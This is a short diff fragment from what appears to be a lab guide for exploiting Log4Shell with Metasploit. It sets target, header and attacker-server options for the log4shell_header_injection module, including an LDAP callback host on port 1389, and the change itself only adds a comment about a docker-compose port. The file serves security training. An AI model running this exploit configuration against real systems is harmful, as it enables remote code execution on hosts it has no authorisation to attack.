@@ -45,7 +45,7 @@ use exploit/multi/http/log4shell_header_injection
 # step 3
 setg HTTP_HEADER X-Api-Version
 setg RHOSTS <target-ip>  # 10.208.89.15
-setg RPORT <target-port> # 8080
+setg RPORT <target-port> # 8080 (or 8081 written in docker-compose file)
 setg SRVHOST <host-server-ip> # 10.208.5.100
 setg SRVPORT <host-server-port> # 1389
 setg TARGETURI <target url> # /
